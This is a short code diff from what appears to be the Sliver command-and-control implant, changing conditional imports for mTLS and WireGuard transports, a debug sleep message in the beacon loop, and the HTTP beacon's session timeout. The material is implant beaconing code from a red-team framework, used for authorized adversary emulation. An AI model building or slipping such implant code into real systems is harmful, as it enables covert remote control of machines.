@@ -24,13 +24,17 @@ import (
 
 	// {{end}}
 
-	"crypto/tls"
 	insecureRand "math/rand"
 	"net/url"
-	"strconv"
 	"time"
 
+	// {{if or .Config.MTLSc2Enabled .Config.WGc2Enabled}}
+	"strconv"
+	// {{end}}
+
 	// {{if .Config.MTLSc2Enabled}}
+	"crypto/tls"
+
 	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
 
 	// {{end}}
@@ -152,7 +156,7 @@ func StartBeaconLoop() *Beacon {
 
 		reconnect := GetReconnectInterval()
 		// {{if .Config.Debug}}
-		log.Printf("Sleep %d second(s) ...", reconnect/time.Second)
+		log.Printf("Sleep %d second(s) ...", reconnect)
 		// {{end}}
 		time.Sleep(reconnect)
 	}
@@ -264,7 +268,8 @@ func httpBeacon(uri *url.URL) (*Beacon, error) {
 	log.Printf("Beaconing -> %s", uri)
 	// {{end}}
 	proxyConfig := uri.Query().Get("proxy")
-	client, err := httpclient.HTTPStartSession(uri.Host, uri.Path, proxyConfig)
+	timeout := GetPollTimeout()
+	client, err := httpclient.HTTPStartSession(uri.Host, uri.Path, timeout, proxyConfig)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("http(s) connection error %s", err)
